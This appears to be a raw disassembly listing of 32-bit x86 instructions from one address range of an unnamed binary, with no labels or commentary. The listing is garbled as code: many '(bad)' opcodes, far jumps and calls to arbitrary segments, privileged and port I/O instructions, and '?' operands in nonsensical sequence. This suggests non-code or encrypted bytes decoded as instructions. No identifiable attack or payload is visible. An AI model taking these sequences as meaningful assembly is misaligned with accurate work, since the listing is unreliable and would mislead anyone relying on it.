  40b41b:	mov    ds:0x6b2865d1,eax
  40b420:	das    
  40b421:	repnz daa 
  40b423:	add    eax,0x88d78fad
  40b428:	imul   eax,DWORD PTR [ebx+0x7b97b9d5],0xffffffee
  40b42f:	(bad)  
  40b430:	dec    ebx
  40b431:	es sbb eax,0xa48e3296
  40b437:	jmp    0x6b96:0x57a97fc3
  40b43e:	movhps QWORD PTR [esi-0x5c],xmm1
  40b442:	dec    edi
  40b443:	(bad)  
  40b444:	into   
  40b445:	cmp    ebx,ecx
  40b447:	(bad)  
  40b448:	dec    edi
  40b449:	adc    DWORD PTR [edx-0x652ce366],edi
  40b44f:	push   esi
  40b450:	aaa    
  40b451:	cmp    al,0xc1
  40b453:	ret    
  40b454:	loope  0x40b4d4
  40b456:	adc    edi,DWORD PTR [eax-0x5b]
  40b459:	mov    es,eax
  40b45b:	outs   dx,DWORD PTR ds:[esi]
  40b45c:	cmp    al,0xe2
  40b45e:	aas    
  40b45f:	sbb    DWORD PTR [eax],ecx
  40b461:	push   edi
  40b462:	inc    ebp
  40b463:	(bad)  
  40b464:	push   edi
  40b465:	or     ebx,DWORD PTR [edx]
  40b467:	in     al,dx
  40b468:	mov    bl,0x8b
  40b46a:	and    dh,bl
  40b46c:	mov    ebp,0x634c3724
  40b471:	std    
  40b472:	xchg   ebx,eax
  40b473:	(bad)
  40b477:	icebp  
  40b478:	xchg   DWORD PTR ds:0xfd458e6f,edx
  40b47e:	imul   esp,DWORD PTR [eax-0x1f],0xe751d59e
  40b485:	(bad)  
  40b486:	scas   eax,DWORD PTR es:[edi]
  40b487:	int    0xa0
  40b489:	(bad)
  40b48d:	cmp    esp,DWORD PTR [esi]
  40b48f:	test   BYTE PTR [eax-0x418d31e3],cl
  40b495:	add    eax,0xa4f3f79f
  40b49a:	vmread esi,esi
  40b49d:	xchg   edx,eax
  40b49e:	dec    esi
  40b49f:	xchg   ecx,eax
  40b4a0:	rol    BYTE PTR [edi+eiz*8],1
  40b4a3:	sar    BYTE PTR ds:0x97389f86,cl
  40b4a9:	retf   
  40b4aa:	mov    ds:0x164a8244,al
  40b4af:	adc    al,BYTE PTR [edx+0x7a09a2b5]
  40b4b5:	sbb    BYTE PTR [edi],0x7e
  40b4b8:	movlps xmm1,QWORD PTR [edi+0x3f440a16]
  40b4bf:	mov    dh,0x91
  40b4c1:	inc    edx
  40b4c2:	aam    0x52
  40b4c4:	clc    
  40b4c5:	retf   
  40b4c6:	sub    ch,BYTE PTR [ecx+0x8]
  40b4c9:	scas   eax,DWORD PTR es:[edi]
  40b4ca:	push   esp
  40b4cb:	jmp    0x3e98:0xc1697846
  40b4d2:	jle    0x40b4a2
  40b4d4:	cmc    
  40b4d5:	xchg   esp,eax
  40b4d6:	pop    esp
  40b4d7:	and    cl,ah
  40b4d9:	mov    al,ds:0x9143c958
  40b4de:	add    al,0xec
  40b4e0:	scas   eax,DWORD PTR es:[edi]
  40b4e1:	mov    al,BYTE PTR [esi]
  40b4e3:	sbb    eax,0xa1463188
  40b4e8:	push   0xffffff8a
  40b4ea:	mov    cl,0x41
  40b4ec:	scas   eax,DWORD PTR es:[edi]
  40b4ed:	pop    ds
  40b4ee:	xor    eax,0x17469f4b
  40b4f3:	xchg   edx,eax
  40b4f4:	out    dx,al
  40b4f5:	adc    eax,0x3f2b2520
  40b4fa:	sbb    eax,DWORD PTR [esi+edx*1]
  40b4fd:	mov    ebx,0x86387c27
  40b502:	cmp    al,0x79
  40b504:	(bad)  
  40b505:	stos   DWORD PTR es:[edi],eax
  40b506:	fst    QWORD PTR [ecx]
  40b508:	daa    
  40b509:	pop    edi
  40b50a:	add    bh,BYTE PTR [esi]
  40b50c:	mov    ah,0x82
  40b50e:	jae    0x40b561
  40b510:	xor    edx,DWORD PTR [ebp+0x68644637]
  40b516:	inc    esi
  40b517:	or     al,BYTE PTR [ecx-0x50f48e97]
  40b51d:	pop    edi
  40b51e:	das    
  40b51f:	sbb    DWORD PTR [eax+0x30],ecx
  40b522:	ins    DWORD PTR es:[edi],dx
  40b523:	scas   eax,DWORD PTR es:[edi]
  40b524:	sub    eax,0x2425ff64
  40b529:	mov    cl,0xd5
  40b52b:	dec    eax
  40b52c:	aam    0x54
  40b52e:	fwait
  40b52f:	push   ebx
  40b530:	mov    esp,0x1788f294
  40b535:	jns    0x40b534
  40b537:	fs dec edx
  40b539:	adc    BYTE PTR [ebx+0x70],al
  40b53c:	loop   0x40b4e6
  40b53e:	jecxz  0x40b537
  40b540:	(bad)  
  40b542:	xchg   edi,eax
  40b543:	repnz out 0x7,eax
  40b546:	mov    BYTE PTR ds:0x9ebfd7f2,0x9f
  40b54d:	imul   ebp,DWORD PTR [ecx+edx*8+0x59584576],0x3
  40b555:	xchg   ebx,eax
  40b556:	outs   dx,DWORD PTR ds:[esi]
  40b557:	pusha  
  40b558:	inc    esp
  40b559:	jns    0x40b59d
  40b55b:	push   ss
  40b55c:	shl    DWORD PTR [ebx+ecx*2+0x7e],1
  40b560:	aam    0x2b
  40b562:	push   ebx
  40b563:	cmp    BYTE PTR [ebp+0x3c],ah
  40b566:	add    DWORD PTR [eax+0x3e10d1f5],edi
  40b56c:	test   DWORD PTR [esi+0x207c6944],eax
  40b572:	bound  esp,QWORD PTR [eax+0xf]
  40b575:	loop   0x40b525
  40b577:	add    eax,DWORD PTR gs:[ebp+ebx*8+0xa97596f]
  40b57f:	push   0xdceb367d
  40b584:	and    eax,0xdebf4530
  40b589:	sbb    bl,bh
  40b58b:	dec    edx
  40b58c:	and    eax,0x5138b605
  40b591:	lahf   
  40b592:	fstp   DWORD PTR [ebp-0x3e]
  40b595:	xor    eax,0xabe6a0ae
  40b59a:	andnps xmm1,XMMWORD PTR [eax-0x4c]
  40b59e:	push   eax
  40b59f:	ja     0x40b5b8
  40b5a1:	xchg   ebp,eax
  40b5a2:	jg     0x40b5a9
  40b5a4:	and    ecx,0x70
  40b5a7:	push   esi
  40b5a8:	xor    al,0xe9
  40b5aa:	pop    ds
  40b5ab:	xchg   esp,eax
  40b5ac:	cmp    eax,0xc8060eff
  40b5b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5b2:	fs sar edx,0x8f
  40b5b6:	aad    0x88
  40b5b8:	shl    BYTE PTR [edx-0x7a076486],cl
  40b5be:	mov    bl,0xb3
  40b5c0:	test   DWORD PTR [edx+0x5],edi
  40b5c3:	ja     0x40b616
  40b5c5:	ja     0x40b56d
  40b5c7:	adc    edi,DWORD PTR [edi]
  40b5c9:	jg     0x40b588
  40b5cb:	adc    BYTE PTR [eax+0x5a],bl
  40b5ce:	mov    esi,esp
  40b5d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b5d1:	fisttp WORD PTR [edx-0xfc8fa34]
  40b5d7:	mov    al,0xa6
  40b5d9:	shl    BYTE PTR [ebx+eiz*8],cl
  40b5dc:	push   edx
  40b5dd:	pop    esp
  40b5de:	sub    edx,DWORD PTR ds:0xe2ddd09a
  40b5e4:	test   al,0xd4
  40b5e6:	xor    BYTE PTR [ecx+0x58543004],dl
  40b5ec:	call   0x6bce4fbb
  40b5f1:	sti    
  40b5f2:	mov    dh,0x8
  40b5f4:	cmp    DWORD PTR [esi-0x2b],edx
  40b5f7:	pop    ecx
  40b5f8:	add    BYTE PTR [edx+eiz*1],dl
  40b5fb:	and    BYTE PTR [edi-0x134e608c],dh
  40b601:	fnsave [eax]
  40b603:	ss stos BYTE PTR es:[edi],al
  40b605:	push   0x38
  40b607:	mov    ds:0xb4554193,al
  40b60c:	adc    ebp,ecx
  40b60e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b60f:	add    al,0xf0
  40b611:	dec    ebp
  40b612:	sti    
  40b613:	lea    ecx,[eax-0x1e27782]
  40b619:	mov    fs,WORD PTR [edi]
  40b61b:	push   esp
  40b61c:	push   ebx
  40b61d:	jg     0x40b5c3
  40b61f:	dec    eax
  40b620:	mov    ebx,0x3d64eed8
  40b625:	int3   
  40b626:	in     eax,dx
  40b627:	in     al,0xe9
  40b629:	stos   BYTE PTR es:[edi],al
  40b62a:	dec    ecx
  40b62b:	dec    ebx
  40b62c:	add    bh,BYTE PTR [ebx+0x34]
  40b62f:	popf   
  40b630:	jmp    0x40b690
  40b632:	xor    dh,BYTE PTR ss:[esi-0x64432b17]
  40b639:	test   al,0xf2
  40b63b:	cs fwait
  40b63d:	lods   eax,DWORD PTR ds:[esi]
  40b63e:	in     eax,dx
  40b63f:	pop    eax
  40b640:	ret    
  40b641:	jecxz  0x40b5fe
  40b643:	(bad)  [ebp-0x15]
  40b646:	push   edi
  40b647:	and    BYTE PTR [edx-0x65],dh
  40b64a:	jns    0x40b669
  40b64c:	(bad)  
  40b64d:	faddp  st(7),st
  40b64f:	shl    BYTE PTR [eax],1
  40b651:	mov    eax,0x604c692e
  40b656:	(bad)  
  40b657:	mov    ebp,0xbaec21ad
  40b65c:	lods   al,BYTE PTR ds:[esi]
  40b65d:	ins    BYTE PTR es:[edi],dx
  40b65e:	push   esi
  40b65f:	mov    ds:0x6532f7d2,eax
  40b664:	push   edi
  40b665:	rdpmc  
  40b667:	fs popf 
  40b669:	shl    DWORD PTR [ecx-0x4d],cl
  40b66c:	out    dx,eax
  40b66d:	inc    edx
  40b66e:	fiadd  WORD PTR [edx+0x66]
  40b671:	inc    esi
  40b672:	fdivr  QWORD PTR [edi+0x3]
  40b675:	and    BYTE PTR [eax-0x5142b9a0],ah
  40b67b:	pop    es
  40b67c:	sub    al,0x2d
  40b67e:	idiv   DWORD PTR [ebx-0x16]
  40b681:	mov    WORD PTR [edi],cs
  40b683:	xor    ebx,DWORD PTR [edi+0x70a93d2e]
  40b689:	push   edx
  40b68a:	std    
  40b68b:	or     ch,BYTE PTR [eax+ecx*4+0x7b136bce]
  40b692:	das    
  40b693:	xor    bh,BYTE PTR [esi-0x7013c718]
  40b699:	pusha  
  40b69a:	jl     0x40b65e
  40b69c:	xor    esp,edi
  40b69e:	test   al,0x38
  40b6a0:	xor    DWORD PTR [edx-0x43cc40],ecx
  40b6a6:	addr16 jle 0x40b657
  40b6a9:	je     0x40b6e0
  40b6ab:	xchg   esi,eax
  40b6ac:	jg     0x40b6e6
  40b6ae:	add    ebp,edx
  40b6b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6b1:	mov    DWORD PTR [edi],ecx
  40b6b3:	scas   eax,DWORD PTR es:[edi]
  40b6b4:	xlat   BYTE PTR ds:[ebx]
  40b6b5:	jecxz  0x40b68a
  40b6b7:	scas   eax,DWORD PTR es:[edi]
  40b6b8:	or     bl,BYTE PTR ds:0xa0db47da
  40b6be:	loope  0x40b6d8
  40b6c0:	fmul   QWORD PTR [ebp-0x6]
  40b6c3:	(bad)  [edi]
  40b6c5:	xlat   BYTE PTR ds:[ebx]
  40b6c6:	call   0xde83b0a
  40b6cb:	aam    0x5c
  40b6cd:	inc    ebx
  40b6ce:	mov    eax,DWORD PTR [eax+0x214358bb]
  40b6d4:	cmp    cl,dh
  40b6d6:	jne    0x40b685
  40b6d8:	pop    ebx
  40b6d9:	sbb    al,0xcc
  40b6db:	dec    ebp
  40b6dc:	std    
  40b6dd:	fbld   TBYTE PTR [esi+0x8]
  40b6e0:	push   edx
  40b6e1:	cmp    DWORD PTR [esi],0xca96e6f5
  40b6e7:	jae    0x40b6c4
  40b6e9:	lea    edx,[edx+esi*1+0x5b1579a0]
  40b6f0:	test   BYTE PTR [edi+0x76b7dca5],bh
  40b6f6:	inc    ebp
  40b6f7:	mov    dl,BYTE PTR [edi-0x4d]
  40b6fa:	xchg   DWORD PTR [ebp-0x51ba4f0e],edx
  40b700:	pushf  
  40b701:	stos   DWORD PTR es:[edi],eax
  40b702:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b703:	out    dx,eax
  40b704:	fcom   DWORD PTR [edx]
  40b706:	repz jo 0x40b6ab
  40b709:	mov    esi,0xc13bffa6
  40b70e:	dec    ebx
  40b70f:	lea    ebx,[ebx+eiz*4-0x3e387dc4]
  40b716:	frstor [edi-0x5f528e88]
  40b71c:	xchg   esi,eax
  40b71d:	fwait
  40b71e:	dec    eax
  40b71f:	fsub   DWORD PTR [edx+0x2c]
  40b722:	xor    ch,BYTE PTR cs:[eax-0x29]
  40b726:	push   0xffffffaf
  40b728:	mov    al,0xa8
  40b72a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b72b:	sbb    bl,ah
  40b72d:	inc    edx
  40b72e:	and    eax,0x5d428107
  40b733:	cmp    eax,0xc39b4cfc
  40b738:	push   eax
  40b739:	mov    ?,WORD PTR [ebx-0x6f108708]
  40b73f:	push   cs
  40b740:	mov    ebp,0xefa4a80
  40b745:	js     0x40b72b
  40b747:	dec    ecx
  40b748:	cmp    al,0x54
  40b74a:	(bad)  
  40b74c:	cmp    ebx,DWORD PTR [edi-0x4e]
  40b74f:	xchg   dh,cl
  40b751:	mov    DWORD PTR [eax+0x6b9229e6],esp
  40b757:	and    BYTE PTR [edx],0xf3
  40b75a:	adc    al,0x55
  40b75c:	int    0x2d
  40b75e:	cmp    eax,0xe287d66
  40b763:	jge    0x40b7db
  40b765:	push   ecx
  40b766:	dec    bp
  40b768:	iret   
  40b769:	mov    ebp,0xd9c9601f
  40b76e:	xchg   BYTE PTR ds:0x5a1c1dda,cl
  40b774:	pop    ebp
  40b775:	out    dx,al
  40b776:	mov    ch,0x5b
  40b778:	jge    0x40b7b2
  40b77a:	sub    esi,DWORD PTR [edx-0x67]
  40b77d:	hlt    
  40b77e:	cmp    eax,0x2208ad4f
  40b783:	dec    eax
  40b784:	test   al,0x4
  40b786:	dec    eax
  40b787:	scas   al,BYTE PTR es:[edi]
  40b788:	test   dh,bh
  40b78a:	xor    dl,ch
  40b78c:	cmp    dl,BYTE PTR [ecx-0x2e]
  40b78f:	push   esp
  40b790:	out    dx,eax
  40b791:	addr16 xor ebx,esi
  40b794:	lahf   
  40b795:	sbb    DWORD PTR [esi-0x46],esi
  40b798:	xor    edi,esi
  40b79a:	inc    ebx
  40b79b:	mov    es,WORD PTR [eax-0x76]
  40b79e:	sbb    dl,BYTE PTR [edi+eiz*4-0x2332427f]
  40b7a5:	and    al,BYTE PTR [ebx-0x3c67e5d6]
  40b7ab:	pop    ds
  40b7ac:	inc    edx
  40b7ad:	xchg   edx,eax
  40b7ae:	jno    0x40b81c
  40b7b0:	daa    
  40b7b1:	push   cs
  40b7b2:	test   DWORD PTR [ebx-0x54ce7fde],esp
  40b7b8:	inc    ebx
  40b7b9:	pop    ds
  40b7ba:	aaa    
  40b7bb:	int    0xdf
  40b7bd:	mov    al,0x49
  40b7bf:	or     DWORD PTR ds:0x9d1fd942,ebx
  40b7c5:	stos   DWORD PTR es:[edi],eax
  40b7c6:	add    ah,0x13
  40b7c9:	mov    bl,0xb2
  40b7cb:	cmp    edi,ebx
  40b7cd:	or     edi,DWORD PTR [edx+0x131577e6]
  40b7d3:	sub    eax,0xc2c09703
  40b7d8:	adc    eax,0x8ead3fa0
  40b7dd:	dec    ebx
  40b7de:	jl     0x40b7eb
  40b7e0:	push   ebp
  40b7e1:	jmp    0x97f9:0xb7383e34
  40b7e8:	sbb    dl,BYTE PTR [ebp-0x5d]
  40b7eb:	add    eax,0xe0244255
  40b7f0:	gs jno 0x40b78d
  40b7f3:	imul   edx,DWORD PTR [ecx-0x7f856d19],0x66e37332
  40b7fd:	adc    eax,eax
  40b7ff:	inc    ecx
  40b800:	push   esi
  40b801:	sbb    DWORD PTR [edx-0x3c],esp
  40b804:	icebp  
  40b805:	retf   0x8302
  40b808:	and    BYTE PTR [ebp+edx*4+0x77dd76c8],0x90
  40b810:	fidivr WORD PTR [edx]
  40b813:	push   ebx
  40b814:	(bad)  
  40b815:	pop    ecx
  40b816:	fwait
  40b817:	test   DWORD PTR [esi],0xa0edc622
  40b81d:	jo     0x40b833
  40b81f:	frstor [edx-0x51]
  40b822:	cmp    al,0x75
  40b824:	mov    WORD PTR [esi+edi*8-0x54],gs
  40b828:	test   DWORD PTR [ecx],edi
  40b82a:	scas   eax,DWORD PTR es:[edi]
  40b82b:	mov    bl,0xec
  40b82d:	mov    dl,0x7c
  40b82f:	les    eax,FWORD PTR [edx-0x678e1713]
  40b835:	test   DWORD PTR [eax-0x609de00b],edi
  40b83b:	repz jmp 0x5362:0x164077d4
  40b843:	sub    bh,BYTE PTR [ebp+0x55c56196]
  40b849:	adc    al,0x27
  40b84b:	jmp    0x1f5d6418
  40b850:	dec    ebx
  40b851:	test   BYTE PTR [ebp-0x4e07eb22],cl
  40b857:	cmp    ebp,edi
  40b859:	push   ebp
  40b85a:	ret    0xddb0
  40b85d:	es ds and eax,0x97b6595f
  40b864:	mov    ah,0xfa
  40b866:	add    eax,ebp
  40b868:	xchg   DWORD PTR [eax+ebp*2],edi
  40b86b:	jmp    0xa0c7:0x33417fc2
  40b872:	xor    DWORD PTR [ecx],ebx
  40b874:	jae    0x40b8c1
  40b876:	jo     0x40b852
  40b878:	dec    ebx
  40b879:	lods   eax,DWORD PTR ds:[esi]
  40b87a:	jno    0x40b803
  40b87c:	addr16 inc esp
  40b87e:	jo     0x40b896
  40b880:	aas    
  40b881:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b882:	dec    ebx
  40b883:	mov    al,ds:0x96f5d76d
  40b888:	scas   eax,DWORD PTR es:[edi]
  40b889:	es inc ebx
  40b88b:	fiadd  WORD PTR [edi+0x1]
  40b88e:	sub    al,0x3d
  40b890:	lock inc edx
  40b892:	adc    edx,DWORD PTR [ecx+0x33d95bc1]
  40b898:	adc    BYTE PTR [ebx],al
  40b89a:	pushf  
  40b89b:	in     eax,dx
  40b89c:	sbb    BYTE PTR [ecx],0xd4
  40b89f:	nop
  40b8a0:	div    BYTE PTR [edx]
  40b8a2:	xchg   ecx,eax
  40b8a3:	adc    al,0x49
  40b8a5:	mov    bh,0x28
  40b8a7:	jne    0x40b862
  40b8a9:	ja     0x40b87e
  40b8ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8ad:	xchg   esp,eax
  40b8ae:	pop    edi
  40b8af:	xchg   esi,eax
  40b8b0:	xchg   esi,eax
  40b8b1:	ror    DWORD PTR [edi+0x48539cc7],0x2
  40b8b8:	xchg   BYTE PTR [ebp+0x5647832d],ah
  40b8be:	sub    BYTE PTR [edi-0x2e],dh
  40b8c1:	xchg   esi,eax
  40b8c2:	push   0xf5d8eb33
  40b8c7:	mov    ?,WORD PTR [eax]
  40b8c9:	push   0xffffffdb
  40b8cb:	xor    DWORD PTR [edx+eax*4-0x47],ebx
  40b8cf:	xor    edx,DWORD PTR [edx-0x5a]
  40b8d2:	push   0xffffffff
  40b8d4:	fwait
  40b8d5:	jb     0x40b8e2
  40b8d7:	scas   al,BYTE PTR es:[edi]
  40b8d8:	dec    eax
  40b8d9:	stc    
  40b8da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b8db:	scas   eax,DWORD PTR es:[edi]
  40b8dc:	push   edx
  40b8dd:	mov    ebp,0xd63cef94
  40b8e2:	mov    DWORD PTR [ebp+0x3c6ed1c0],ebx
  40b8e8:	mov    BYTE PTR [ebp+0x62],ah
  40b8eb:	fmul   st,st(4)
  40b8ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8ee:	add    DWORD PTR [edx-0x7b],edi
  40b8f1:	mov    cl,0xd1
  40b8f3:	fcmovb st,st(2)
  40b8f5:	lahf   
  40b8f6:	mov    ds:0x2347aeb7,eax
  40b8fb:	ficom  WORD PTR [ebx]
  40b8fd:	sub    BYTE PTR [edi+0x6ba0af24],ah
  40b903:	in     al,0x3
  40b905:	xchg   esi,eax
  40b906:	sbb    al,BYTE PTR [edx-0x7c]
  40b909:	lds    ecx,FWORD PTR [edi]
  40b90b:	jle    0x40b91f
  40b90d:	ss pushf 
  40b90f:	pusha  
  40b910:	dec    edi
  40b911:	sbb    DWORD PTR [edi-0x5bb57ead],ebp
  40b917:	jb     0x40b927
  40b919:	ss mov esi,0x19a42ba0
  40b91f:	jl     0x40b917
  40b921:	or     ah,BYTE PTR [ebp+0x54]
  40b924:	cdq    
  40b925:	add    DWORD PTR [edi],edx
  40b927:	cmp    eax,0x3890104c
  40b92c:	call   0xadfd90d7
  40b931:	(bad)  [ebx+0x494ae0dd]
  40b937:	xchg   edx,eax
  40b938:	push   ebx
  40b939:	jl     0x40b8c6
  40b93b:	jmp    0xb8203b2b
  40b940:	mov    bh,0xe
  40b942:	in     al,0x6b
  40b944:	mov    DWORD PTR [ebx-0x3c],ecx
  40b947:	cmp    DWORD PTR ds:0x6fb30057,esp
  40b94d:	outs   dx,DWORD PTR ds:[esi]
  40b94e:	and    eax,0x7487cc05
  40b953:	(bad)  [eax+0x70]
  40b956:	ss mov ah,0xff
  40b959:	adc    DWORD PTR [esi-0x7a9dc89],edi
  40b95f:	inc    eax
  40b960:	mov    cl,0xf2
  40b962:	xor    edx,DWORD PTR [ebx]
  40b964:	stc    
  40b965:	jle    0x40b934
  40b967:	ins    BYTE PTR es:[edi],dx
  40b968:	loope  0x40b963
  40b96a:	pop    edx
  40b96b:	jno    0x40b92f
  40b96d:	cmp    esi,ebx
  40b96f:	jmp    0x40b9ba
  40b971:	scas   eax,DWORD PTR es:[edi]
  40b972:	mov    dl,0xa5
  40b974:	push   ecx
  40b975:	repnz mov BYTE PTR [esi+0x466c9dbc],bh
  40b97c:	xor    al,0x2d
  40b97e:	adc    ebx,DWORD PTR [esi+0x76644a1]
  40b984:	jle    0x40b9d3
  40b986:	ins    BYTE PTR es:[edi],dx
  40b987:	sar    DWORD PTR [ebx-0x2380c97f],cl
  40b98d:	rcpps  xmm2,XMMWORD PTR [ebx+ecx*2-0x180fcce]
  40b995:	not    DWORD PTR [edx+eiz*2+0x1ad074e9]
  40b99c:	jg     0x40b94e
  40b99e:	dec    eax
  40b99f:	dec    ebx
  40b9a0:	cmp    ch,BYTE PTR [ebx-0x4dc564f9]
  40b9a6:	or     al,0xe4
  40b9a8:	sahf   
  40b9a9:	rcr    BYTE PTR [ebp-0x156f9206],1
  40b9af:	push   edx
  40b9b0:	in     eax,0x5e
  40b9b2:	test   DWORD PTR [esi+0x248a37c3],edi
  40b9b8:	sub    dl,dl
  40b9ba:	push   0x95e9f30f
  40b9bf:	scas   al,BYTE PTR es:[edi]
  40b9c0:	pop    esp
  40b9c1:	loop   0x40b9f9
  40b9c3:	pusha  
  40b9c4:	sub    eax,0xb180ad2a
  40b9c9:	sub    edi,0x2e
  40b9cc:	int3   
  40b9cd:	lods   eax,DWORD PTR ds:[esi]
  40b9ce:	stos   BYTE PTR es:[edi],al
  40b9cf:	jg     0x40b9be
  40b9d1:	fwait
  40b9d2:	out    dx,eax
  40b9d3:	in     al,0xa3
  40b9d5:	imul   ecx,DWORD PTR [eax-0x7e],0x64
  40b9d9:	push   ecx
  40b9da:	test   BYTE PTR [ebp+0x11],ah
  40b9dd:	and    DWORD PTR [ebp+edx*1+0x1795ed4d],ecx
  40b9e4:	pop    ebx
  40b9e5:	cwde   
  40b9e6:	retf   0xd74f
  40b9e9:	int3   
  40b9ea:	(bad)  
  40b9eb:	mov    eax,0xdb5ff44
  40b9f0:	ds icebp 
  40b9f2:	aad    0x13
  40b9f4:	or     eax,0xb9a850fc
  40b9f9:	push   esp
  40b9fa:	adc    eax,0xa5e01648
  40b9ff:	cli    
  40ba00:	popa   
  40ba01:	or     BYTE PTR [ecx-0x6b],dl
  40ba04:	mov    esp,0xcbd2db7
  40ba09:	sub    DWORD PTR [edi],0x2e
  40ba0c:	into   
  40ba0d:	iret   
  40ba0e:	pop    edx
  40ba0f:	js     0x40ba56
  40ba11:	int3   
  40ba12:	retf   
  40ba13:	sbb    ah,BYTE PTR [esi+0x3a05e139]
  40ba19:	xlat   BYTE PTR ds:[ebx]
  40ba1a:	idiv   BYTE PTR [esi+ecx*8+0x690ba2c1]
  40ba21:	js     0x40ba55
  40ba23:	mov    ecx,0x429409b1
  40ba28:	pop    esi
  40ba29:	sahf   
  40ba2a:	aam    0x5f
  40ba2c:	stc    
  40ba2d:	xor    al,0xb3
  40ba2f:	pop    eax
  40ba30:	daa    
  40ba31:	not    BYTE PTR [edx]
  40ba33:	je     0x40ba5a
  40ba35:	dec    eax
  40ba36:	into   
  40ba37:	out    dx,al
  40ba38:	or     BYTE PTR [ebx],bh
  40ba3a:	cmp    BYTE PTR [ecx],cl
  40ba3c:	inc    esp
  40ba3d:	aas    
  40ba3e:	and    DWORD PTR [edx+0x7a95922a],ecx
  40ba44:	stos   DWORD PTR es:[edi],eax
  40ba45:	fwait
  40ba46:	sbb    ebx,esi
  40ba48:	ins    BYTE PTR es:[edi],dx
  40ba49:	mov    dl,BYTE PTR [ebx-0x2b490934]
  40ba4f:	(bad)  
  40ba50:	nop
  40ba51:	sub    DWORD PTR [ecx-0x71],0xffffffb5
  40ba55:	mov    bh,0x11
  40ba57:	mov    eax,DWORD PTR cs:[edi-0x743dd8e5]
  40ba5e:	hlt    
  40ba5f:	cli    
  40ba60:	fstp   TBYTE PTR [ebx-0x7c]
  40ba63:	retf   
  40ba64:	add    eax,0xedd714cd
  40ba69:	ins    DWORD PTR es:[edi],dx
  40ba6a:	inc    eax
  40ba6b:	(bad)  [ebx-0x25]
  40ba6e:	je     0x40ba66
  40ba70:	jmp    0x37e29aaf
  40ba75:	retf   
  40ba76:	xchg   BYTE PTR [esi],dl
  40ba78:	cmp    eax,0x28e0cd81
  40ba7d:	xlat   BYTE PTR ds:[ebx]
  40ba7e:	dec    edx
  40ba7f:	or     DWORD PTR [esi+0x8],ebp
  40ba82:	shl    edx,0x8e
  40ba85:	cmp    eax,DWORD PTR [eax]
  40ba87:	jg     0x40ba86
  40ba89:	add    al,0x7
  40ba8b:	(bad)  
  40ba8c:	mov    al,ds:0x57f64b10
  40ba91:	call   0x476:0x66c71524
  40ba98:	sbb    eax,0x291f29cd
  40ba9d:	js     0x40bae6
  40ba9f:	sub    ebp,DWORD PTR [eax-0x5b16a752]
  40baa5:	xchg   edi,eax
  40baa6:	ja     0x40bb00
  40baa8:	mov    al,ds:0x591c4700
  40baad:	popf   
  40baae:	dec    ebx
  40baaf:	aam    0x82
  40bab1:	inc    eax
  40bab2:	sub    DWORD PTR [ebp+edx*2-0x48126113],eax
  40bab9:	jmp    0x40ba89
  40babb:	leave  
  40babc:	xchg   BYTE PTR [eax],bh
  40babe:	xor    ecx,DWORD PTR [ebp*4-0xa190e90]
  40bac5:	mov    ebp,ecx
  40bac7:	lar    edi,bx
  40baca:	fimul  DWORD PTR [esi]
  40bacc:	push   ds
  40bacd:	mov    edi,0x4f3570b0
  40bad2:	inc    eax
  40bad3:	fisub  DWORD PTR [ebp+eiz*2+0x37]
  40bad7:	mov    ds:0x6befcdfd,eax
  40badc:	arpl   bp,sp
  40bade:	cs clc 
  40bae0:	out    dx,al
  40bae1:	pop    esi
  40bae2:	pop    ebx
  40bae3:	mov    ds:0xb79786b2,eax
  40bae8:	lea    edx,[ebx+0x48]
  40baeb:	leave  
  40baec:	outs   dx,BYTE PTR ds:[esi]
  40baed:	or     edi,esp
  40baef:	add    DWORD PTR [edi],0x2
  40baf2:	jno    0x40bae3
  40baf4:	lods   al,BYTE PTR ds:[esi]
  40baf5:	xlat   BYTE PTR ss:[ebx]
  40baf7:	pop    ecx
  40baf8:	adc    BYTE PTR [edx-0x44a63e40],0x6f
  40baff:	jmp    0x5e43c4
  40bb04:	adc    DWORD PTR [eax-0x7a0c5942],edx
  40bb0a:	xchg   ecx,eax
  40bb0b:	test   DWORD PTR [edx+0x630c6691],ebx
  40bb11:	mov    ebp,0xb657f52b
  40bb16:	fsubr  QWORD PTR [ebp-0x49bbffdf]
  40bb1c:	pushf  
  40bb1d:	repz sbb ah,BYTE PTR [edi+0x1a8e7638]
  40bb24:	pop    es
  40bb25:	(bad)  
  40bb26:	xor    esi,DWORD PTR [ebx+0x15]
  40bb29:	lock dec eax
  40bb2b:	push   ss
  40bb2c:	daa    
  40bb2d:	aad    0x7e
  40bb2f:	jb     0x40bb97
  40bb31:	mov    ecx,0xcd46c2dd
  40bb36:	jno    0x40bbb4
  40bb38:	mov    ah,al
  40bb3a:	stc    
  40bb3b:	or     al,0xdc
  40bb3d:	and    al,0xfc
  40bb3f:	popf   
  40bb40:	mov    ch,0xff
  40bb42:	push   esi
  40bb43:	test   eax,0x7373edce
  40bb48:	repnz mov eax,0x25736c56
  40bb4e:	rcr    DWORD PTR [edx+ecx*2+0xc8608c9],1
  40bb55:	cmp    edx,DWORD PTR [edx+ebp*4+0x1d]
  40bb59:	fiadd  WORD PTR [edi-0x5121958]
  40bb5f:	loopne 0x40bb35
  40bb61:	jb     0x40bb0d
  40bb63:	mov    edi,0x153fe23
  40bb68:	fldcw  WORD PTR ds:[eax+0x7]
  40bb6c:	mov    ebp,DWORD PTR [esi+0x3e63a055]
  40bb72:	(bad)  
  40bb73:	sbb    dh,BYTE PTR ds:0x8263b3a6
  40bb79:	es rcl edx,1
  40bb7c:	inc    ebx
  40bb7d:	and    al,0x65
  40bb7f:	xchg   BYTE PTR [eax+ecx*4+0x39],bl
  40bb83:	sbb    DWORD PTR [edx+0x65],edx
  40bb86:	shl    BYTE PTR [edi],cl
  40bb88:	dec    ebx
  40bb89:	out    0x90,al
  40bb8b:	mov    eax,ds:0x1c4ee6b2
  40bb90:	stc    
  40bb91:	inc    ebp
  40bb92:	mov    esi,0x6493b60a
  40bb97:	jecxz  0x40bb25
  40bb99:	mov    cl,0x36
